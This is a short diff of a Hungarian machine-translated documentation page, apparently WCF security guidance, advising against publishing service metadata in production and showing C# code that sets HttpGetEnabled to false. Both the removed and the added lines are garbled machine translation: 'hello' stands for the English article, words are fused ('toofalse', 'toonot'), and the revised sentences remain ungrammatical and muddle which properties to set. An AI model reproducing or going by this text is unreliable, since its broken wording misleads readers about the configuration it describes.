-Éles környezetben a szolgáltatás metaadatai nem szórási. Állítsa be a hello HttpGetEnabled / hello ServiceMetaData HttpsGetEnabled tulajdonságainak toofalse osztály. 
+Éles környezetben a szolgáltatás metaadatai nem szórási. Állítsa be a HttpGetEnabled / FALSE osztály a konfigurációs ServiceMetaData HttpsGetEnabled tulajdonságait. 
 
 ### <a name="example"></a>Példa
-az alábbi kód hello arra utasítja a WCF toonot szórási a szolgáltatás metaadatai. 
+Az alábbi kódot a szolgáltatás metaadatai nem közvetíti WCF utasítja. 
 ```
 ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
 smb.HttpGetEnabled = false; 
